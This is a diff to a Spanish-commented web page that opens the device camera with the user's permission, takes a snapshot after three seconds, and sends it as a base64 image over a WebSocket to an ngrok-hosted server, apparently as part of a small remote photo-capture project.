@@ -1,4 +1,3 @@
-<!-- celular.html -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -9,7 +8,8 @@
     <canvas id="snapshotCanvas" style="display:none;"></canvas>
 
     <script>
-        const socket = new WebSocket('ws://localhost:80/ws/capture/');
+        
+        const socket = new WebSocket('wss://79e5-200-92-166-60.ngrok-free.app/ws/capture/');
 
         socket.onmessage = function(event) {
             const data = JSON.parse(event.data);
@@ -18,13 +18,43 @@
             }
         };
 
+
+        
         function iniciarCaptura() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     document.getElementById('cameraStream').srcObject = stream;
                     document.getElementById('cameraStream').style.display = 'block';
+                    
+                    // Captura una imagen después de 1 segundo de iniciar el video
+                    setTimeout(capturarImagen, 3000); // Cambia el tiempo si es necesario
                 })
                 .catch(err => console.error('Error al acceder a la cámara: ' + err));
+        }
+
+        function capturarImagen() {
+            const video = document.getElementById('cameraStream');
+            const canvas = document.getElementById('snapshotCanvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Dibujar el video en el canvas
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir el canvas a una imagen base64
+            const imageData = canvas.toDataURL('image/png');
+
+            // Enviar la imagen al servidor
+            socket.send(JSON.stringify({ action: 'save_image', image: imageData }));
+
+            // Detener el stream de la cámara
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+
+            // Opcional: Ocultar el video después de tomar la imagen
+            video.style.display = 'none';
         }
     </script>
 </body>
